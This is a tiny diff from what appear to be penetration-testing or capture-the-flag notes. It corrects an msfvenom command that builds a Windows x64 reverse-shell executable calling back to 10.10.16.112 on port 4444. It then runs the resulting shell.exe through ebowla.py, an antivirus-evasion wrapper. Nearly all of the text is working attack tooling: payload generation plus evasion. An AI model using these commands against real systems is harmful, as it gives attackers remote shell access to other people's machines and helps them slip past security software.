@@ -1,4 +1,4 @@
-msfvenom -p windows/x64/shell/reverse_tcp -a x64 LPORT=4444 LHOST=10.10.16.112 -f exe > shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 LPORT=4444 LHOST=10.10.16.112 -f exe > shell.exe
 
 python ebowla.py shell.exe geneticustom.config
 
